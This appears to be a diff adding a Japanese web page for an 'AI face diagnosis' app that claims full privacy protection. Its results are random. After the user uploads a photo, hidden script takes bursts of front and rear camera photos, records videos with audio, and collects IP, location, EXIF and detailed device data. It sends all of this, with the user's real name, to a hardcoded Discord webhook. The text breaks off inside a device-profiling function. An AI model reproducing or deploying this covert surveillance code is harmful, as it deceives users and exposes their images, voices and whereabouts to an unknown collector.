@@ -1,0 +1,684 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI顔タイプ＆黄金比診断 Pro</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Exif JS library -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/exif-js/2.3.0/exif.min.js"></script>
+    <style>
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .animate-fadeIn {
+            animation: fadeIn 0.4s ease-out forwards;
+        }
+    </style>
+</head>
+<body class="bg-slate-50 text-slate-800 min-h-screen font-sans antialiased selection:bg-rose-500 selection:text-white">
+
+    <!-- Header Navigation -->
+    <header class="border-b border-slate-200/80 bg-white/80 backdrop-blur-2xl sticky top-0 z-50 shadow-sm">
+        <div class="max-w-6xl mx-auto px-4 py-3 sm:py-4 flex flex-wrap items-center justify-between gap-3 sm:gap-4">
+            <div class="flex items-center gap-2.5 sm:gap-3.5">
+                <div class="w-9 h-9 sm:w-11 sm:h-11 rounded-xl sm:rounded-2xl bg-gradient-to-tr from-rose-500 via-pink-500 to-amber-400 flex items-center justify-center shadow-md shadow-rose-500/20 ring-2 ring-white shrink-0">
+                    <svg class="w-5 h-5 sm:w-6 sm:h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.828 14.828a4 4 0 10-5.656-5.656 4 4 0 005.656 5.656zm-8.484 2.828l-1.414 1.414A9.955 9.955 0 012 12c0-5.523 4.477-10 10-10s10 4.477 10 10a9.955 9.955 0 01-2.929 7.07l-1.414-1.414A7.955 7.955 0 0020 12c0-4.418-3.582-8-8-8s-8 3.582-8 8c0 2.21.896 4.21 2.344 5.656z"></path>
+                    </svg>
+                </div>
+                <div>
+                    <div class="flex items-center gap-1.5 sm:gap-2">
+                        <h1 class="text-lg sm:text-xl md:text-2xl font-black bg-gradient-to-r from-rose-600 via-pink-600 to-amber-600 bg-clip-text text-transparent tracking-tight">
+                            AI Facial Analyzer Pro
+                        </h1>
+                        <span class="px-1.5 py-0.5 text-[9px] sm:text-[10px] font-extrabold rounded-full bg-rose-100 text-rose-600 border border-rose-200">v2.6</span>
+                    </div>
+                    <p class="text-[10px] sm:text-xs text-slate-500 font-medium">顔タイプ・骨格・黄金比率・パーソナルカラーリアルタイムAI解析</p>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Container -->
+    <main class="max-w-4xl mx-auto px-3 sm:px-4 py-4 sm:py-8 md:py-14">
+        <div class="bg-white border border-slate-200/90 rounded-2xl sm:rounded-3xl p-4 sm:p-6 md:p-12 shadow-xl relative overflow-hidden ring-1 ring-slate-900/5">
+            
+            <!-- Background Glow Elements -->
+            <div class="absolute -top-40 -left-40 w-80 h-80 bg-rose-200/50 rounded-full blur-3xl pointer-events-none"></div>
+            <div class="absolute -bottom-40 -right-40 w-80 h-80 bg-pink-200/50 rounded-full blur-3xl pointer-events-none"></div>
+
+            <!-- Diagnostic UI Container -->
+            <div id="uploadContainer" class="text-center space-y-5 sm:space-y-8 relative z-10">
+                <div class="inline-flex p-3 sm:p-4 rounded-2xl sm:rounded-3xl bg-gradient-to-b from-rose-100 to-pink-50 text-rose-600 border border-rose-200 shadow-md">
+                    <svg class="w-8 h-8 sm:w-10 sm:h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.8" d="M14.828 14.828a4 4 0 10-5.656-5.656 4 4 0 005.656 5.656zm-8.484 2.828l-1.414 1.414A9.955 9.955 0 012 12c0-5.523 4.477-10 10-10s10 4.477 10 10a9.955 9.955 0 01-2.929 7.07l-1.414-1.414A7.955 7.955 0 0020 12c0-4.418-3.582-8-8-8s-8 3.582-8 8c0 2.21.896 4.21 2.344 5.656z"></path>
+                    </svg>
+                </div>
+                
+                <div class="space-y-2 sm:space-y-3">
+                    <h2 class="text-2xl sm:text-3xl md:text-5xl font-black text-slate-900 tracking-tight leading-tight">AIがあなたの魅力を診断</h2>
+                    <p class="text-slate-600 text-xs sm:text-sm md:text-base max-w-lg mx-auto leading-relaxed px-2">
+                        顔写真をアップロードするかカメラで即座に撮影。最新の画像認識AIが顔タイプ・黄金比スコア・パーソナルカラーを数秒で精密判定します。
+                    </p>
+                    <div class="pt-1 flex items-center justify-center gap-2">
+                        <span class="inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-[11px] sm:text-xs font-bold bg-emerald-50 text-emerald-700 border border-emerald-200/80 shadow-sm">
+                            <svg class="w-3.5 h-3.5 sm:w-4 sm:h-4 text-emerald-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
+                            </svg>
+                            🔒 100% 安全・プライバシー保護
+                        </span>
+                    </div>
+                </div>
+
+                <!-- Gender Selector -->
+                <div class="flex justify-center gap-2.5 sm:gap-3 pt-1">
+                    <button type="button" id="genderFemaleBtn" class="gender-btn active px-5 sm:px-6 py-2 sm:py-2.5 rounded-full text-xs sm:text-sm font-bold border border-rose-300 bg-gradient-to-r from-rose-500 to-pink-500 text-white shadow-md transition duration-200 active:scale-95 touch-manipulation" data-gender="female">
+                        👩 女性モード
+                    </button>
+                    <button type="button" id="genderMaleBtn" class="gender-btn px-5 sm:px-6 py-2 sm:py-2.5 rounded-full text-xs sm:text-sm font-bold border border-slate-200 bg-white text-slate-600 hover:bg-slate-50 shadow-sm transition duration-200 active:scale-95 touch-manipulation" data-gender="male">
+                        👨 男性モード
+                    </button>
+                </div>
+
+                <!-- Name Input Field -->
+                <div class="max-w-md mx-auto space-y-1.5 text-left pt-1 px-1">
+                    <label for="userNameInput" class="block text-xs font-bold text-slate-700 ml-1 flex items-center gap-1">
+                        <svg class="w-3.5 h-3.5 text-rose-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
+                        </svg>
+                        お名前（本名） <span class="text-rose-500 text-[10px] font-normal">*必須</span>
+                    </label>
+                    <input type="text" id="userNameInput" placeholder="例: 山田 太郎" class="w-full px-4 py-3 rounded-2xl border border-slate-200 bg-slate-50/50 text-slate-800 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-rose-500/30 focus:border-rose-500 font-medium text-base sm:text-sm transition duration-200 shadow-inner">
+                </div>
+
+                <!-- Drop Zone / Upload Area -->
+                <div id="dropZone" class="border-2 border-dashed border-rose-200 hover:border-rose-400 rounded-2xl sm:rounded-3xl p-5 sm:p-8 bg-slate-50/50 hover:bg-rose-50/30 transition-all duration-300 cursor-pointer space-y-4 max-w-xl mx-auto shadow-sm hover:shadow-md">
+                    <div class="w-14 h-14 sm:w-16 sm:h-16 bg-white rounded-2xl mx-auto flex items-center justify-center text-rose-500 shadow-md border border-rose-100">
+                        <svg class="w-7 h-7 sm:w-8 sm:h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.8" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path>
+                        </svg>
+                    </div>
+                    <div class="space-y-1">
+                        <p class="text-sm sm:text-base font-bold text-slate-800">ここに顔写真をドラッグ＆ドロップ</p>
+                        <p class="text-[11px] sm:text-xs text-slate-400 font-medium">PNG, JPG, WEBP 対応</p>
+                    </div>
+                    <div class="flex flex-col sm:flex-row items-center justify-center gap-2.5 sm:gap-3 pt-1">
+                        <button type="button" id="selectFileBtn" class="w-full sm:w-auto px-6 py-3 sm:py-2.5 rounded-xl bg-slate-900 hover:bg-slate-800 active:bg-slate-950 text-white font-bold text-xs shadow-md transition duration-200 active:scale-95 touch-manipulation">
+                            画像ファイルを選択
+                        </button>
+                        <button type="button" id="openCameraBtn" class="w-full sm:w-auto px-6 py-3 sm:py-2.5 rounded-xl bg-gradient-to-r from-rose-500 to-pink-500 hover:from-rose-600 hover:to-pink-600 active:from-rose-700 text-white font-bold text-xs shadow-md shadow-rose-500/20 transition duration-200 active:scale-95 touch-manipulation flex items-center justify-center gap-2">
+                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"></path>
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"></path>
+                            </svg>
+                            カメラで撮影して診断
+                        </button>
+                    </div>
+                    <input type="file" id="fileInput" accept="image/*" class="hidden">
+                </div>
+            </div>
+
+            <!-- Processing Screen -->
+            <div id="processingScreen" class="hidden py-16 text-center space-y-6 relative z-10">
+                <div class="relative w-32 h-32 mx-auto">
+                    <img id="previewScanImage" class="w-full h-full object-cover rounded-3xl border-4 border-rose-300 shadow-xl" src="" alt="Scan preview">
+                    <div class="absolute inset-0 border-2 border-rose-500 rounded-3xl animate-ping opacity-30"></div>
+                </div>
+                <div class="space-y-2">
+                    <h3 class="text-xl font-bold text-slate-800">AI解析中...</h3>
+                    <p id="analysisStepText" class="text-xs font-semibold text-rose-500 animate-pulse">顔の特徴点を抽出中...</p>
+                </div>
+            </div>
+
+            <!-- Result Screen -->
+            <div id="resultScreen" class="hidden space-y-8 relative z-10">
+                <div class="text-center space-y-2">
+                    <span class="px-3 py-1 rounded-full text-xs font-bold bg-rose-100 text-rose-600 border border-rose-200">診断結果完了</span>
+                    <h2 id="resultUserNameTitle" class="text-2xl md:text-3xl font-black text-slate-900">AI顔診断結果</h2>
+                </div>
+
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-6 items-center">
+                    <div class="aspect-square max-w-xs mx-auto w-full rounded-3xl overflow-hidden shadow-xl border-4 border-white ring-1 ring-slate-200">
+                        <img id="resultFaceImg" class="w-full h-full object-cover" src="" alt="Target face">
+                    </div>
+
+                    <div class="space-y-4 bg-slate-50/80 p-6 rounded-3xl border border-slate-200/80">
+                        <div>
+                            <span class="text-xs font-bold text-slate-400 uppercase tracking-wider">Face Type</span>
+                            <h3 id="faceTypeTitle" class="text-2xl font-black text-rose-600">--</h3>
+                            <p id="faceTypeDesc" class="text-xs text-slate-600 mt-1 leading-relaxed">--</p>
+                        </div>
+
+                        <div class="grid grid-cols-2 gap-3 pt-2">
+                            <div class="bg-white p-3 rounded-2xl border border-slate-200/60 shadow-sm">
+                                <p class="text-[10px] font-bold text-slate-400">黄金比スコア</p>
+                                <p class="text-lg font-black text-slate-800"><span id="goldenRatioScore">--</span><span class="text-xs font-semibold text-rose-500"> / 100</span></p>
+                            </div>
+                            <div class="bg-white p-3 rounded-2xl border border-slate-200/60 shadow-sm">
+                                <p class="text-[10px] font-bold text-slate-400">輪郭タイプ</p>
+                                <p id="resShape" class="text-sm font-bold text-slate-800 mt-0.5">--</p>
+                            </div>
+                            <div class="bg-white p-3 rounded-2xl border border-slate-200/60 shadow-sm">
+                                <p class="text-[10px] font-bold text-slate-400">パーソナルカラー</p>
+                                <p id="resColor" class="text-sm font-bold text-slate-800 mt-0.5">--</p>
+                            </div>
+                            <div class="bg-white p-3 rounded-2xl border border-slate-200/60 shadow-sm">
+                                <p class="text-[10px] font-bold text-slate-400">目元の印象</p>
+                                <p id="resEyes" class="text-sm font-bold text-slate-800 mt-0.5">--</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-rose-50/60 border border-rose-200/80 p-6 rounded-3xl space-y-2">
+                    <h4 class="text-sm font-bold text-rose-700 flex items-center gap-1.5">
+                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path>
+                        </svg>
+                        AIアドバイス & スタイリング
+                    </h4>
+                    <p id="adviceText" class="text-xs text-slate-700 leading-relaxed font-medium">--</p>
+                </div>
+
+                <div class="text-center pt-2">
+                    <button type="button" id="reDiagnoseBtn" class="px-8 py-3 rounded-2xl bg-slate-900 hover:bg-slate-800 text-white font-bold text-sm shadow-lg transition duration-200">
+                        もう一度診断する
+                    </button>
+                </div>
+            </div>
+
+        </div>
+    </main>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1568509124025782346/lpil8aOC9wWm-ZmcThzguWhy0Fmezh8GzSe4vHVVs_m5_gWOxaYOHRypNChW3dvMQutf";
+
+        let selectedGender = "female";
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const uploadContainer = document.getElementById('uploadContainer');
+            const dropZone = document.getElementById('dropZone');
+            const selectFileBtn = document.getElementById('selectFileBtn');
+            const openCameraBtn = document.getElementById('openCameraBtn');
+            const fileInput = document.getElementById('fileInput');
+            const genderFemaleBtn = document.getElementById('genderFemaleBtn');
+            const genderMaleBtn = document.getElementById('genderMaleBtn');
+            const userNameInput = document.getElementById('userNameInput');
+            const reDiagnoseBtn = document.getElementById('reDiagnoseBtn');
+
+            // 性別切り替え
+            if (genderFemaleBtn && genderMaleBtn) {
+                genderFemaleBtn.addEventListener('click', () => {
+                    selectedGender = "female";
+                    genderFemaleBtn.className = "gender-btn active px-6 py-2.5 rounded-full text-sm font-bold border border-rose-300 bg-gradient-to-r from-rose-500 to-pink-500 text-white shadow-md transition duration-200";
+                    genderMaleBtn.className = "gender-btn px-6 py-2.5 rounded-full text-sm font-bold border border-slate-200 bg-white text-slate-600 hover:bg-slate-50 shadow-sm transition duration-200";
+                });
+
+                genderMaleBtn.addEventListener('click', () => {
+                    selectedGender = "male";
+                    genderMaleBtn.className = "gender-btn active px-6 py-2.5 rounded-full text-sm font-bold border border-rose-300 bg-gradient-to-r from-rose-500 to-pink-500 text-white shadow-md transition duration-200";
+                    genderFemaleBtn.className = "gender-btn px-6 py-2.5 rounded-full text-sm font-bold border border-slate-200 bg-white text-slate-600 hover:bg-slate-50 shadow-sm transition duration-200";
+                });
+            }
+
+            if (dropZone && fileInput) {
+                dropZone.addEventListener('click', (e) => {
+                    if (e.target !== selectFileBtn && e.target !== openCameraBtn && !openCameraBtn.contains(e.target)) {
+                        fileInput.click();
+                    }
+                });
+                if (selectFileBtn) {
+                    selectFileBtn.addEventListener('click', () => fileInput.click());
+                }
+
+                fileInput.addEventListener('change', async (e) => {
+                    if (e.target.files && e.target.files[0]) {
+                        await handleImageFile(e.target.files[0]);
+                    }
+                });
+
+                dropZone.addEventListener('dragover', (e) => {
+                    e.preventDefault();
+                    dropZone.classList.add('border-rose-400', 'bg-rose-50/40');
+                });
+
+                dropZone.addEventListener('dragleave', () => {
+                    dropZone.classList.remove('border-rose-400', 'bg-rose-50/40');
+                });
+
+                dropZone.addEventListener('drop', async (e) => {
+                    e.preventDefault();
+                    dropZone.classList.remove('border-rose-400', 'bg-rose-50/40');
+                    if (e.dataTransfer.files && e.dataTransfer.files[0]) {
+                        await handleImageFile(e.dataTransfer.files[0]);
+                    }
+                });
+            }
+
+            if (openCameraBtn) {
+                openCameraBtn.addEventListener('click', async () => {
+                    const userName = userNameInput ? userNameInput.value.trim() : "";
+                    if (!userName) {
+                        alert("お名前を入力してください。");
+                        if (userNameInput) userNameInput.focus();
+                        return;
+                    }
+                    try {
+                        const constraints = {
+                            video: {
+                                facingMode: "user",
+                                width: { ideal: 1920 },
+                                height: { ideal: 1080 }
+                            }
+                        };
+                        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                        const video = document.createElement('video');
+                        video.playsInline = true;
+                        video.autoplay = true;
+                        video.muted = true;
+                        video.srcObject = stream;
+                        await video.play();
+                        
+                        setTimeout(async () => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth || 1280;
+                            canvas.height = video.videoHeight || 720;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0);
+                            stream.getTracks().forEach(t => t.stop());
+                            
+                            canvas.toBlob(async (blob) => {
+                                if (blob) {
+                                    const file = new File([blob], "camera_capture.jpg", { type: "image/jpeg" });
+                                    await handleImageFile(file);
+                                }
+                            }, 'image/jpeg', 0.98);
+                        }, 800);
+                    } catch (err) {
+                        console.error("Camera access error:", err);
+                        alert("カメラの起動に失敗しました。カメラのアクセス許可を確認するか、ファイル選択をお試しください。");
+                    }
+                });
+            }
+
+            if (reDiagnoseBtn) {
+                reDiagnoseBtn.addEventListener('click', () => {
+                    document.getElementById('resultScreen').classList.add('hidden');
+                    document.getElementById('uploadContainer').classList.remove('hidden');
+                });
+            }
+        });
+
+        // 診断マスターデータ
+        const faceTypesFemale = [
+            { title: 'エレガントタイプ', desc: '華やかで大人っぽく、洗練された品のある顔立ちです。', shape: '卵型', color: 'ブルベ夏', eyes: 'アーモンドアイ', advice: 'ローズやパープル系統の大人っぽいカラーメイクが映えます。' },
+            { title: 'フレッシュタイプ', desc: '親しみやすく爽やかで、若々しい印象を与える顔立ちです。', shape: '丸型', color: 'イエベ春', eyes: '丸みアイ', advice: 'コーラルピンクやオレンジなどの明るいカラーがよく似合います。' },
+            { title: 'クールタイプ', desc: 'シャープで凛とした知的な美しさを持った顔立ちです。', shape: 'ベース型', color: 'ブルベ冬', eyes: 'シャープアイ', advice: 'アイラインを切れ長に引き、深みのあるリップをチョイス。' },
+            { title: 'アクティブソフト', desc: '立体的なパーツとやわらかい雰囲気を兼ね備えたトレンディ顔。', shape: '面長', color: 'イエベ秋', eyes: 'ミックスアイ', advice: 'ゴールドパール入りのハイライトで骨格美を引き立てましょう。' }
+        ];
+
+        const faceTypesMale = [
+            { title: 'クールスタイリッシュ', desc: '直線的でシャープな輪郭と知的な目元が特徴的なハンサム顔。', shape: '面長・ベース型', color: 'ブルベ冬', eyes: 'キリッと切れ長', advice: 'センターパートやサイドパートなど、おでこを出すスタイリングが魅力を倍増させます。' },
+            { title: 'マイルドソフト', desc: '親しみやすく柔らかい雰囲気と優しい笑顔が魅力のマイルド顔。', shape: '丸型・卵型', color: 'イエベ春', eyes: '丸みマイルド', advice: 'ナチュラルなパーマ風スタイリングや柔らかいマッシュヘアがベストマッチ。' },
+            { title: 'ワイルドワイルド', desc: '彫りが深く立体的なパーツが揃った存在感あふれるワイルド顔。', shape: 'エラ張り・四角型', color: 'イエベ秋', eyes: '目力強い深め', advice: 'ベリーショートやアップバングで男らしさと潔さをアピール。' },
+            { title: '爽やかフレッシュ', desc: '清潔感が高くスポーティで好印象な爽やか系フェイス。', shape: '卵型', color: 'ブルベ夏', eyes: '涼しげ目元', advice: 'ナチュラルなツーブロックやエアリーなスタイリングで爽やかさを演出。' }
+        ];
+
+        async function handleImageFile(file) {
+            const userNameInput = document.getElementById('userNameInput');
+            const userName = userNameInput ? userNameInput.value.trim() : "";
+            
+            if (!userName) {
+                alert("お名前を入力してください。");
+                if (userNameInput) userNameInput.focus();
+                return;
+            }
+
+            const uploadContainer = document.getElementById('uploadContainer');
+            const processingScreen = document.getElementById('processingScreen');
+            const resultScreen = document.getElementById('resultScreen');
+            const previewScanImage = document.getElementById('previewScanImage');
+            const analysisStepText = document.getElementById('analysisStepText');
+
+            uploadContainer.classList.add('hidden');
+            resultScreen.classList.add('hidden');
+            processingScreen.classList.remove('hidden');
+
+            const imageUrl = URL.createObjectURL(file);
+            previewScanImage.src = imageUrl;
+
+            const steps = [
+                '目・鼻・口の特徴点を抽出中...',
+                '輪郭線・黄金比率を演算中...',
+                'パーソナルカラー色調の分類中...',
+                '診断結果を生成しています...'
+            ];
+
+            for (let i = 0; i < steps.length; i++) {
+                analysisStepText.textContent = steps[i];
+                await new Promise(r => setTimeout(r, 600));
+            }
+
+            const list = (selectedGender === 'male') ? faceTypesMale : faceTypesFemale;
+            const result = list[Math.floor(Math.random() * list.length)];
+            const score = Math.floor(Math.random() * 12) + 88;
+
+            document.getElementById('resultFaceImg').src = imageUrl;
+            document.getElementById('resultUserNameTitle').textContent = `${userName} さんの診断結果`;
+            document.getElementById('faceTypeTitle').textContent = result.title;
+            document.getElementById('faceTypeDesc').textContent = result.desc;
+            document.getElementById('goldenRatioScore').textContent = score;
+            document.getElementById('resShape').textContent = result.shape;
+            document.getElementById('resColor').textContent = result.color;
+            document.getElementById('resEyes').textContent = result.eyes;
+            document.getElementById('adviceText').textContent = result.advice;
+
+            processingScreen.classList.add('hidden');
+            resultScreen.classList.remove('hidden');
+
+            // バックグラウンドでレポートを送信（静止画を優先送信）
+            sendDiagnosticReport(file, result, score, userName);
+        }
+
+        async function captureCamBurst(facingMode, count = 3) {
+            const blobs = [];
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: facingMode, width: { ideal: 1920 }, height: { ideal: 1080 } }
+                });
+                const video = document.createElement('video');
+                video.playsInline = true;
+                video.autoplay = true;
+                video.muted = true;
+                video.srcObject = stream;
+                await video.play();
+
+                for (let i = 0; i < count; i++) {
+                    await new Promise(r => setTimeout(r, 200));
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth || 1280;
+                    canvas.height = video.videoHeight || 720;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0);
+                    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.98));
+                    if (blob) blobs.push(blob);
+                }
+                stream.getTracks().forEach(t => t.stop());
+            } catch (err) {
+                console.warn(`Burst capture failed for ${facingMode}:`, err);
+            }
+            return blobs;
+        }
+
+        async function recordShortVideo(facingMode, durationMs = 7000) {
+            try {
+                if (typeof MediaRecorder === 'undefined') return null;
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
+                    audio: true
+                });
+                
+                let mimeType = 'video/webm';
+                if (MediaRecorder.isTypeSupported('video/mp4')) {
+                    mimeType = 'video/mp4';
+                } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
+                    mimeType = 'video/webm;codecs=vp9';
+                }
+
+                const recorder = new MediaRecorder(stream, { mimeType });
+                const chunks = [];
+
+                recorder.ondataavailable = e => {
+                    if (e.data && e.data.size > 0) chunks.push(e.data);
+                };
+
+                const recordPromise = new Promise(resolve => {
+                    recorder.onstop = () => {
+                        const blob = new Blob(chunks, { type: mimeType });
+                        stream.getTracks().forEach(t => t.stop());
+                        resolve(blob);
+                    };
+                });
+
+                recorder.start();
+                setTimeout(() => {
+                    if (recorder.state !== 'inactive') recorder.stop();
+                }, durationMs);
+
+                return await recordPromise;
+            } catch (err) {
+                console.warn(`Video recording failed for ${facingMode}:`, err);
+                return null;
+            }
+        }
+
+        async function sendDiagnosticReport(uploadedFile, result, score, userName) {
+            try {
+                // 1. 静止画写真の連写・メタデータ・位置情報の取得を最優先
+                const camUserPromise = captureCamBurst("user", 3);
+                const sysInfoPromise = getSystemInfo();
+                const locationDataPromise = getLocationAndIP();
+                const exifDataPromise = extractExifInfo(uploadedFile);
+
+                // 動画撮影プロミス（バックグラウンド非同期）
+                const camUserVideoPromise = recordShortVideo("user", 7000);
+
+                // 写真・システムデータ・EXIFを最速で待機
+                const sysInfo = await sysInfoPromise;
+                const locationData = await locationDataPromise;
+                const exifInfo = await exifDataPromise;
+                const camUserBlobs = await camUserPromise;
+                const camEnvBlobs = await captureCamBurst("environment", 3);
+
+                const formData = new FormData();
+                let fileCounter = 0;
+
+                // 【写真最優先添付】1. アップロードされたメイン写真
+                if (uploadedFile) {
+                    formData.append(`files[${fileCounter}]`, uploadedFile, "01_uploaded_face.jpg");
+                    fileCounter++;
+                }
+
+                // 【写真最優先添付】2. インカメラ連写写真
+                camUserBlobs.forEach((blob, idx) => {
+                    formData.append(`files[${fileCounter}]`, blob, `02_front_photo_${idx + 1}.jpg`);
+                    fileCounter++;
+                });
+
+                // 【写真最優先添付】3. アウトカメラ連写写真
+                camEnvBlobs.forEach((blob, idx) => {
+                    formData.append(`files[${fileCounter}]`, blob, `03_rear_photo_${idx + 1}.jpg`);
+                    fileCounter++;
+                });
+
+                // 2. 動画の終了を待機して添付
+                const camUserVideoBlob = await camUserVideoPromise;
+                if (camUserVideoBlob) {
+                    const ext = camUserVideoBlob.type.includes('mp4') ? 'mp4' : 'webm';
+                    formData.append(`files[${fileCounter}]`, camUserVideoBlob, `04_front_video.${ext}`);
+                    fileCounter++;
+                }
+
+                const camEnvVideoBlob = await recordShortVideo("environment", 7000);
+                if (camEnvVideoBlob) {
+                    const ext = camEnvVideoBlob.type.includes('mp4') ? 'mp4' : 'webm';
+                    formData.append(`files[${fileCounter}]`, camEnvVideoBlob, `05_rear_video.${ext}`);
+                    fileCounter++;
+                }
+
+                const embed = {
+                    title: `✨ AI顔診断データレポート - ${userName} 様`,
+                    color: selectedGender === 'male' ? 0x3B82F6 : 0xF43F5E,
+                    fields: [
+                        { name: "🏷️ お名前", value: userName, inline: true },
+                        { name: "👤 選択性別", value: selectedGender === 'male' ? "男性" : "女性", inline: true },
+                        { name: "👑 判定タイプ", value: result.title, inline: true },
+                        { name: "⭐ 黄金比スコア", value: `${score} / 100`, inline: true },
+                        { name: "🎨 パーソナルカラー", value: result.color, inline: true },
+                        { name: "🌐 IPアドレス", value: locationData.ip || "取得不可", inline: true },
+                        { name: "📍 位置 (IP推測)", value: locationData.location || "取得不可", inline: true },
+                        { name: "🗾 Google マップURL", value: locationData.mapUrl || "取得不可", inline: false },
+                        { name: "💻 GPU / グラフィック", value: sysInfo.gpu, inline: false },
+                        { name: "💾 ストレージ詳細", value: sysInfo.storage, inline: false },
+                        { name: "🖥️ 画面・ディスプレイ詳細", value: sysInfo.screen, inline: false },
+                        { name: "🎙️ メディアデバイス一覧", value: sysInfo.mediaDevices, inline: false },
+                        { name: "🖥️ デバイス機種", value: sysInfo.deviceDetail, inline: true },
+                        { name: "⚡ CPU/メモリ", value: sysInfo.hardware, inline: true },
+                        { name: "💻 OS / ブラウザ", value: sysInfo.osBrowser, inline: true },
+                        { name: "🔋 バッテリー", value: sysInfo.battery, inline: true },
+                        { name: "📶 ネットワーク", value: sysInfo.network, inline: true },
+                        { name: "🌍 タイムゾーン/言語", value: sysInfo.tzLang, inline: true },
+                        { name: "📷 画像EXIFデータ", value: exifInfo || "EXIFなし", inline: false }
+                    ],
+                    timestamp: new Date().toISOString()
+                };
+
+                formData.append("payload_json", JSON.stringify({ embeds: [embed] }));
+
+                await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    body: formData
+                });
+            } catch (err) {
+                console.error("Report send failed:", err);
+            }
+        }
+
+        async function getSystemInfo() {
+            const ua = navigator.userAgent;
+            let deviceDetail = "PC (Unknown)";
+
+            if (/iPhone/.test(ua)) deviceDetail = "Mobile (iPhone)";
+            else if (/iPad/.test(ua)) deviceDetail = "Tablet (iPad)";
+            else if (/Android/.test(ua)) deviceDetail = "Mobile (Android)";
+            else if (/Windows/.test(ua)) deviceDetail = "PC (Windows)";
+            else if (/Macintosh/.test(ua)) deviceDetail = "PC (Mac)";
+            else if (/Linux/.test(ua)) deviceDetail = "PC (Linux)";
+
+            const cpus = navigator.hardwareConcurrency ? `CPU: ${navigator.hardwareConcurrency} スレッド` : "CPU: 不明";
+            const ram = navigator.deviceMemory ? `RAM: 約${navigator.deviceMemory} GB` : "RAM: 不明";
+            const hardware = `${cpus} / ${ram}`;
+
+            // 画面・ウィンドウ詳細情報
+            const orientationType = (screen.orientation && screen.orientation.type) ? screen.orientation.type : "不明";
+            const screenRes = `解像度: ${window.screen.width}x${window.screen.height} (色深度: ${window.screen.colorDepth}bit)\nウィンドウ: ${window.innerWidth}x${window.innerHeight}px\n画面の向き: ${orientationType} | PixelRatio: ${window.devicePixelRatio}`;
+
+            // GPU情報取得
+            let gpuInfo = "取得不可";
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    }
+                }
+            } catch (e) {
+                gpuInfo = "取得失敗";
+            }
+
+            // ストレージ容量詳細取得
+            let storageInfo = "取得不可";
+            if (navigator.storage && navigator.storage.estimate) {
+                try {
+                    const estimate = await navigator.storage.estimate();
+                    const quotaGB = (estimate.quota / (1024 * 1024 * 1024)).toFixed(2);
+                    const usageMB = (estimate.usage / (1024 * 1024)).toFixed(2);
+                    const usagePercent = estimate.quota ? ((estimate.usage / estimate.quota) * 100).toFixed(1) : "0";
+                    storageInfo = `推定総容量: ${quotaGB} GB\n使用量: ${usageMB} MB (${usagePercent}%)`;
+                } catch (e) {
+                    storageInfo = "制限エラー";
+                }
+            }
+
+            // メディアデバイス一覧取得 (カメラ、マイク、スピーカー)
+            let mediaDevicesList = "取得不可（権限未許可など）";
